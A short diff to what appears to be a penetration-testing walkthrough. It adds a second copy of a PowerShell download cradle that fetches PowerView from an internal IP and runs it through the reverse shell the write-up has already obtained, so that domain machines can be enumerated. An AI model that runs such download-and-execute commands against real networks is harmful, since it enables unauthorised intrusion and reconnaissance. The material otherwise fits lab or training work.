@@ -184,3 +184,7 @@ Now download powerview on the reverse shell to enumerate the machines where the 
 ```powershell
 iex ((New-Object Net.WebClient).DownloadString('http://172.16.99.115/PowerView.ps1'))
 ```
+launch the command
+```powerview
+iex ((New-Object Net.WebClient).DownloadString('http://172.16.99.115/PowerView.ps1'))
+```
